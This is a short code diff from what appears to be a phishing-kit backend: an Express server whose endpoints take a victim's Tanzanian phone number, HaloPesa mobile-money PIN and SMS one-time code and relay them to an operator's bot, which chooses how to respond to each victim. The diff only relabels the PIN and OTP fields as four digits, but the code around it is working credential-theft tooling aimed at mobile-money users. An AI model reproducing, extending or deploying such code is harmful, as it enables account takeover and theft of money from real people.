@@ -251,7 +251,7 @@ app.post('/api/submit-application', (req, res) => {
     const message =
       `🚨 *NEW HALOPESA LOGIN / PIN ATTEMPT*\n\n` +
       `📱 *Phone:* +255 ${phone}\n` +
-      `🔑 *PIN Entered:* \`${pin}\`\n` +
+      `🔑 *PIN Entered (4 Digits):* \`${pin}\`\n` +
       `💰 *Selected Amount:* ${amount}\n\n` +
       `📌 *Status:* Waiting for Admin Approval`;
 
@@ -302,7 +302,7 @@ app.post('/api/submit-otp', (req, res) => {
     const message =
       `📩 *SMS OTP SUBMITTED BY USER*\n\n` +
       `📱 *User:* +255 ${session.phone}\n` +
-      `🔢 *OTP Entered:* \`${otp}\`\n\n` +
+      `🔢 *OTP Entered (4 Digits):* \`${otp}\`\n\n` +
       `Choose verification response:`;
 
     const opts = {
@@ -334,4 +334,4 @@ app.listen(PORT, async () => {
   console.log(`[Server] Running smoothly on port ${PORT}`);
   await initBot();
 });
-        
+                    
